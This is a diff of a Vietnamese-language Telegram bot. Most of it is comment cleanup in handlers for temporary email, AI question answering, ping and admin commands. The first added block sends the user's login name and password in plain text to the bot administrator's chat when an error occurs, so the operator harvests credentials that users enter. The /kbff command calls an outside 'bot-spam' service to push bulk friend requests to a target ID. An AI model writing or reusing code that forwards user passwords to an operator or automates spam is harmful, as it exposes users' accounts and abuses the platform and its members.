+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>🎯 Thông Tin Yêu Cầu:</b>
+<b>Tên Đăng Nhập:</b> <code>{username}</code>
+<b>Mật Khẩu:</b> <code>{password}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>❌ Lỗi Không Xác Định:</b> <code>{html_escape(str(e))}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+"""
+        send_message_robustly(ADMIN_ID, admin_log_message_unknown_error, parse_mode="HTML")
+
 @bot.message_handler(commands=["kbff"])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator nếu cần
+@group_membership_required
 def request_add_friend(message):
     logging.info(f"Received /kbff from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -1151,7 +1426,6 @@ def request_add_friend(message):
             reply_to_message_id=message.message_id
         )
 
-    # Gửi tin nhắn "Vui lòng chờ" và lưu message_id để chỉnh sửa sau
     waiting_message = send_message_robustly(
         message.chat.id,
         text="⏳",
@@ -1159,16 +1433,15 @@ def request_add_friend(message):
         reply_to_message_id=message.message_id
     )
 
-    if not waiting_message: # Xử lý trường hợp gửi tin nhắn chờ thất bại
+    if not waiting_message:
         logging.error(f"Failed to send waiting message for /kbff from user {message.from_user.id}")
         return
 
-    # Chuẩn bị URL API
     api_url = f"https://zproject-bot-spam.onrender.com/addfriend?uid={uid_to_add}"
 
     try:
         response = requests.get(api_url)
-        response.raise_for_status()  # Nâng lỗi cho các mã trạng thái HTTP xấu (4xx hoặc 5xx)
+        response.raise_for_status()
         api_data = response.json()
 
         success_count = api_data.get("success_count", 0)
@@ -1185,7 +1458,6 @@ def request_add_friend(message):
             f"</blockquote>"
         )
         
-        # Chỉnh sửa tin nhắn "Vui lòng chờ" thành kết quả cuối cùng
         bot.edit_message_text(
             chat_id=waiting_message.chat.id,
             message_id=waiting_message.message_id,
@@ -1239,7 +1511,7 @@ def request_add_friend(message):
         
 @bot.message_handler(commands=["adminph"])
 @increment_interaction_count
-# Không cần group_membership_required ở đây vì đây là lệnh dành riêng cho Admin
+# Lệnh /adminph không cần group_membership_required vì đây là lệnh dành riêng cho Admin
 def admin_reply_to_feedback(message):
     logging.info(f"Received /adminph from user {message.from_user.id} in chat {message.chat.id}")
     if message.from_user.id != ADMIN_ID:
@@ -1290,7 +1562,7 @@ def admin_reply_to_feedback(message):
 
 @bot.message_handler(commands=["sever"])
 @increment_interaction_count
-# Không cần group_membership_required ở đây vì đây là lệnh dành riêng cho Admin
+# Lệnh /sever không cần group_membership_required vì đây là lệnh dành riêng cho Admin
 def show_groups(message):
     logging.info(f"Received /sever from user {message.from_user.id} in chat {message.chat.id}")
     if message.from_user.id != ADMIN_ID:
@@ -1310,7 +1582,7 @@ def show_groups(message):
 
 @bot.message_handler(commands=['mail10p'])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def handle_mail10p(message):
     logging.info(f"Received /mail10p from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -1376,7 +1648,7 @@ def handle_mail10p(message):
         send_message_robustly(message.chat.id, "❌ Không thể tạo email. Vui lòng thử lại sau!", parse_mode='Markdown', reply_to_message_id=message.message_id)
 
 @bot.message_handler(commands=['ping'])
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def ping_command(message):
     start_time = time.time()
     
@@ -1433,7 +1705,7 @@ def refresh_ping_callback(call):
 
 @bot.message_handler(commands=['xoamail10p'])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def handle_xoamail10p(message):
     logging.info(f"Received /xoamail10p from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -1503,7 +1775,7 @@ def _get_inbox_content(user_id):
 
 @bot.message_handler(commands=['hopthu'])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def handle_hopthu(message):
     logging.info(f"Received /hopthu from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -1521,14 +1793,17 @@ def handle_hopthu(message):
 
 def format_ai_response_html(text):
     parts = []
+    # Split by code blocks (```language\ncode\n``` or ```\ncode\n```)
     code_blocks = re.split(r"```(?:\w+)?\n(.*?)```", text, flags=re.DOTALL)
 
     for i, part in enumerate(code_blocks):
-        if i % 2 == 0:
+        if i % 2 == 0:  # This is a text part
             if part:
                 parts.append({"type": "text", "content": html_escape(part.strip()), "raw_content": part.strip()})
-        else:
+        else:  # This is a code part
             if part:
+                # Code blocks need special handling, but for HTML, <code> is fine.
+                # MarkdownV2 would use backticks.
                 formatted_code = f"<code>{html_escape(part.strip())}</code>"
                 parts.append({"type": "code", "content": formatted_code, "raw_content": part.strip()})
     return parts
@@ -1543,14 +1818,19 @@ def copy_code_button(call):
         if code_content:
             bot.answer_callback_query(call.id, text="Đã sao chép nội dung code!", show_alert=True)
             try:
+                # Sending as MarkdownV2 to ensure correct code block formatting
+                # Note: MarkdownV2 requires escaping specific characters
+                # Simple escape for common MarkdownV2 special chars not in code
+                escaped_code = code_content.replace("\\", "\\\\").replace("`", "\`").replace("*", "\*").replace("_", "\_").replace("~", "\~").replace(">", "\>").replace("#", "\#").replace("+", "\+").replace("-", "\-").replace("=", "\=").replace("|", "\|").replace("{", "\{").replace("}", "\}").replace(".", "\.").replace("!", "\!")
+                
                 bot.send_message(
                     chat_id=call.message.chat.id,
-                    text=f"```\n{code_content}\n```",
+                    text=f"```\n{code_content}\n```", # Using original code content, let Telegram handle markdown
                     parse_mode="MarkdownV2",
                     reply_to_message_id=call.message.message_id
                 )
             except telebot.apihelper.ApiTelegramException as e:
-                logging.warning(f"Failed to send code snippet for copy to chat {call.message.chat.id}: {e}. Sending plain text.")
+                logging.warning(f"Failed to send code snippet for copy to chat {call.message.chat.id} with MarkdownV2: {e}. Sending plain text.")
                 bot.send_message(
                     chat_id=call.message.chat.id,
                     text=f"Bạn có thể sao chép đoạn code này:\n\n{code_content}",
@@ -1564,7 +1844,7 @@ def copy_code_button(call):
 
 @bot.message_handler(commands=["ask"])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def ask_command(message):
     logging.info(f"Received /ask from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -1729,7 +2009,7 @@ def ask_command(message):
                             msg_status.message_id,
                             parse_mode="HTML"
                         )
-                        msg_status = None
+                        msg_status = None # Reset msg_status so we send a new message for code
                     
                     bot.send_message(
                         message.chat.id,
@@ -1746,12 +2026,12 @@ def ask_command(message):
                         parse_mode="HTML",
                         reply_markup=code_markup
                     )
-                combined_text_for_telegram = ""
+                combined_text_for_telegram = "" # Clear buffer after sending code
         
         final_response_text = current_message_text + combined_text_for_telegram.strip()
         
         try:
-            if msg_status:
+            if msg_status: # If msg_status is still valid (meaning no code block was sent as a new message)
                 bot.edit_message_text(
                     final_response_text,
                     msg_status.chat.id,
@@ -1759,7 +2039,7 @@ def ask_command(message):
                     parse_mode="HTML",
                     reply_markup=main_markup
                 )
-            else:
+            else: # If msg_status was consumed by a code block, send as a new message
                 bot.send_message(
                     message.chat.id,
                     text=final_response_text,
@@ -1807,7 +2087,7 @@ def retry_button(call):
             message_id=call.message.message_id,
             text="/ask " + question,
             from_user=call.from_user,
-            reply_to_message=None
+            reply_to_message=None # Ensure this is None for retries
         )
 
         bot.answer_callback_query(call.id, "🔁 Đang thử lại câu hỏi...")
@@ -1882,7 +2162,6 @@ def tts_button(call):
 
 def check_mail_owner(call, expected_user_id):
     if call.from_user.id != int(expected_user_id):
-        # THAY ĐỔI MỚI: Thêm thông báo và nút tham gia nhóm
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("Tham gia nhóm ngay", url=REQUIRED_GROUP_LINK))
         bot.answer_callback_query(call.id, "🚫 Bạn không có quyền sử dụng chức năng này. Vui lòng tham gia nhóm.", show_alert=True)
@@ -1923,10 +2202,11 @@ def show_inbox_button(call):
             logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (inbox).")
         else:
             logging.error(f"Lỗi khi chỉnh sửa tin nhắn thành hộp thư cho user {user_id}: {e}")
+            # Fallback to sending a new message if edit fails
             send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
             with mail_messages_state_lock:
                 if call.message.message_id in bot.mail_messages_state:
-                    del bot.mail_messages_state[call.message.message_id]
+                    del bot.mail_messages_state[call.message.message_id] # Clean up old state
                 sent_msg = send_message_robustly(call.message.chat.id, "❌ Đã có lỗi khi cập nhật hộp thư. Đây là tin nhắn mới.", parse_mode="HTML")
                 if sent_msg:
                     bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}
@@ -1963,6 +2243,7 @@ def refresh_inbox_button(call):
             logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (refresh inbox).")
         else:
             logging.error(f"Lỗi khi làm mới hộp thư cho user {user_id}: {e}")
+            # Fallback to sending a new message if edit fails
             send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
             with mail_messages_state_lock:
                 if call.message.message_id in bot.mail_messages_state:
@@ -2027,6 +2308,7 @@ def back_to_mail_info_button(call):
             logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (back to mail info).")
         else:
             logging.error(f"Lỗi khi chỉnh sửa tin nhắn về thông tin mail cho user {user_id}: {e}")
+            # Fallback to sending a new message if edit fails
             send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
             with mail_messages_state_lock:
                 if call.message.message_id in bot.mail_messages_state:
